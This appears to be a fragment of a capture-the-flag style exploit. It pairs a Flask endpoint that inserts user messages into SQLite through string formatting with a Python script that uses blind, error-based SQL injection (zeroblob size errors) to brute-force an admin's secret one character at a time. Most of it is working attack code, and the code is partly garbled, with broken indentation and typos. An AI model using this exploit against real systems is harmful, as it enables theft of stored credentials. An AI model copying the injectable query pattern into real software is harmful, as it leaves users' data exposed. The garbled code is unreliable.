#@app.route("/submitmessage."method =["POST"])
def submitmessage():
	message = request.form.get("message",'')
	if len(message) > 140:
		return "message too long"
	if badword_in_str(message):
		return "forbidden word in message"
	# insert new message in DB
	try:
		query_db("insert into messages values ('%s')" % message)
	except sqlite3.Error as e:
		return str(e)
	return "OK"

def inject(session, condition):
	global num_requests
	error_message = 'string or blob too big'

try:
	injection = "'),((SELECT CASE WHEN %s THEN 1 ELSE zeroblob(1000000000) END)--" % (condition)
	res = session.post("%s/submitmessage" % URL, data={"message": injection})
	if res.status_code !=200 or (res.text != "OK" and res.text != error_message):
		print("[-] Server returned: %d %s -%s" % (res.status_code, res.reason, res,text))
		exit(1)

except:
	return False

return res.text !=error_message

def brutestr(session, condition):
	found_str = ""
	found = True
	while found:
		found = False
		for x in string.printable:
			if x == "'":
				x = "'"
			if x == '%':
				continue

			print(found_str + x)
			if inject(session, condition % (len(found_str)+1,x)):
				found_str += x
				found =  True
				break

	return found_str
secret = brutestr(session, "(SELECT substr(secret,%d,1) FROM users WHERE username='admin' LIMIT 1)='%'")
print ("Found secret:", secret)